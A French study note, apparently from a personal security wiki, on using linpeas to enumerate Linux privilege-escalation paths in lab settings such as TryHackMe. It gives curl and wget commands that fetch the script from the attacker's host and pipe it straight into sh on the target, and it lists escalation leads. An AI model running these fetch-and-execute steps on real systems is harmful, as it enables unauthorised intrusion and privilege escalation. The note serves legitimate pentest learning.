---
title: "linpeas : énumération de privesc Linux"
tags: [securite, linux, terminal]
created: 2026-09-14
updated: 2026-09-19
status: stable
---

## En bref

Une fois qu'on a un shell sur une machine Linux, ce script **liste
automatiquement les vecteurs d'élévation de privilèges** (*privilege
escalation*, *privesc*) : binaires SUID, tâches cron, mots de passe en clair,
permissions douteuses, versions vulnérables. Il ne fait rien tout seul — il
**signale**, on creuse ensuite. Équivalent Windows : **winpeas**.

## Le déposer et le lancer

Le vrai problème n'est pas la commande, c'est de faire arriver le script sur une
cible souvent **sans accès Internet** vers GitHub. On le sert depuis sa propre
machine :

```sh
python3 -m http.server 8000                        # sur l'attaquant : servir le dossier
```

```sh
curl 10.10.10.9:8000/linpeas.sh | sh               # sur la cible : recuperer et lancer sans ecrire sur le disque
wget -qO- 10.10.10.9:8000/linpeas.sh | sh          # variante si curl est absent
```

`10.10.10.9` = **ton** IP (sur THM, `tun0`). Le pipe `| sh` évite de laisser le
fichier sur le disque ; sinon `chmod +x linpeas.sh && ./linpeas.sh`.

## Lire la sortie : suivre les couleurs

linpeas crache des centaines de lignes. **Ne pas lire ligne à ligne** — la
lecture se fait par le surlignage :

- **Rouge sur fond jaune** = quasi certainement exploitable, à regarder **en
  premier**.
- Rouge seul = intéressant, à vérifier.
- Le reste est du contexte.

L'essentiel des privesc sort des lignes rouge/jaune.

## Où regarder en priorité

| Piste | Pourquoi |
| --- | --- |
| `sudo -l` | ce qu'on peut lancer en root sans mot de passe |
| SUID inhabituels | un binaire root exécutable par tous → **GTFOBins** |
| Tâches cron | un script lancé en root qu'on peut modifier |
| Capabilities | `cap_setuid`… sur un binaire |
| Mots de passe | en clair dans une config, un historique, une variable |
| Version du noyau | exploit connu — **dernier recours** |

## Pièges

- **Il signale, il n'exploite pas.** Une ligne SUID rouge → aller voir sur
  [GTFOBins](https://gtfobins.github.io/) *comment* ce binaire donne un shell
  root. linpeas t'amène à la porte, il ne l'ouvre pas.
- **Sortie énorme** : la tentation de tout lire fait perdre le vecteur évident.
  Aller directement aux surlignages rouge/jaune, élargir seulement si rien.
- **L'exploit noyau est le dernier recours**, pas le premier : instable, il peut
  planter la machine. Épuiser sudo, SUID et cron avant.
- **Bruyant** : il touche à tout le système, un EDR le voit. Sans importance sur
  THM ; en engagement réel, à peser.
- **Cadre légal.** Uniquement sur une machine où l'on a un accès autorisé.

## Voir aussi

- [Quel outil pour quel objectif](quel-outil.md)
- [Metasploit : le framework d'exploitation](metasploit.md)
- [Windows : reconnaissance système en ligne de commande](../windows/reconnaissance.md)
- [Maliciels, attaques et vocabulaire des menaces](menaces.md)
- <https://gtfobins.github.io/>
